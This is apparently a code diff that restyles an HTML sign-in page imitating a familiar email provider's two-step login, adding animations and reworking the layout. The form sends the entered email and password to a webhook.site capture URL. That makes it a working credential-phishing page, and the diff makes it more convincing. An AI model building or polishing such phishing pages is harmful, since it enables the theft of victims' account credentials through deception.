@@ -6,68 +6,137 @@
   <title>Sign In</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       font-family: 'Roboto', sans-serif;
       background-color: #f1f3f4;
       margin: 0;
       padding: 0;
+      height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
     }
+
     .container {
       background: #fff;
       padding: 48px 40px;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       width: 100%;
       max-width: 400px;
+      overflow: hidden;
+      position: relative;
     }
+
     .logo {
-      width: 75px;
-      margin-bottom: 16px;
+      width: 72px;
+      margin: 0 auto 20px;
+      display: block;
+      animation: fadeIn 1s ease-out;
     }
+
     h2 {
       font-weight: 400;
       font-size: 24px;
       margin-bottom: 8px;
+      text-align: center;
+      animation: fadeIn 1s ease-out;
     }
+
+    .input-field {
+      position: relative;
+      margin: 24px 0;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: slideUp 0.5s forwards;
+    }
+
+    .input-field:nth-child(1) {
+      animation-delay: 0.3s;
+    }
+
+    .input-field:nth-child(2) {
+      animation-delay: 0.5s;
+    }
+
     input {
       width: 100%;
       padding: 14px;
       font-size: 16px;
       border: 1px solid #dadce0;
-      border-radius: 4px;
-      margin: 16px 0;
+      border-radius: 6px;
+      transition: border-color 0.3s;
     }
+
+    input:focus {
+      outline: none;
+      border-color: #1a73e8;
+    }
+
+    .button-group {
+      margin-top: 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
     button {
       background-color: #1a73e8;
       color: white;
       border: none;
-      padding: 12px;
-      width: 100%;
+      padding: 12px 24px;
       font-size: 16px;
       border-radius: 4px;
       cursor: pointer;
+      transition: background-color 0.3s;
     }
+
     button:hover {
       background-color: #1558b0;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    @keyframes slideUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .hidden {
+      display: none;
     }
   </style>
 </head>
 <body>
+
   <div class="container">
-    <img class="logo" src="https://via.placeholder.com/75x75?text=LOGO" alt="Logo">
+    <img class="logo" src="https://via.placeholder.com/72?text=LOGO" alt="Logo" />
     <h2 id="formTitle">Sign in</h2>
 
     <form id="loginForm" action="https://webhook.site/dbd0ab12-b57d-4b7d-9567-457cb1d8abf9" method="POST">
-      <input type="email" id="emailInput" name="email" placeholder="Email or phone" required />
       
-      <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required style="display: none;" />
-      
-      <button type="button" id="nextBtn">Next</button>
-      <button type="submit" id="loginBtn" style="display: none;">Login</button>
+      <div class="input-field" id="emailField">
+        <input type="email" id="emailInput" name="email" placeholder="Email or phone" required />
+      </div>
+
+      <div class="input-field hidden" id="passwordField">
+        <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required />
+      </div>
+
+      <div class="button-group">
+        <button type="button" id="nextBtn">Next</button>
+        <button type="submit" id="loginBtn" class="hidden">Login</button>
+      </div>
+
     </form>
   </div>
 
@@ -75,21 +144,25 @@
     const nextBtn = document.getElementById('nextBtn');
     const loginBtn = document.getElementById('loginBtn');
     const emailInput = document.getElementById('emailInput');
-    const passwordInput = document.getElementById('passwordInput');
+    const passwordField = document.getElementById('passwordField');
+    const emailField = document.getElementById('emailField');
     const formTitle = document.getElementById('formTitle');
 
     nextBtn.addEventListener('click', () => {
       if (emailInput.checkValidity()) {
         emailInput.readOnly = true;
         emailInput.style.backgroundColor = '#f1f3f4';
-        passwordInput.style.display = 'block';
-        nextBtn.style.display = 'none';
-        loginBtn.style.display = 'block';
+        emailField.classList.add('readonly');
+
+        passwordField.classList.remove('hidden');
+        loginBtn.classList.remove('hidden');
+        nextBtn.classList.add('hidden');
         formTitle.textContent = "Welcome";
       } else {
         emailInput.reportValidity();
       }
     });
   </script>
+
 </body>
 </html>
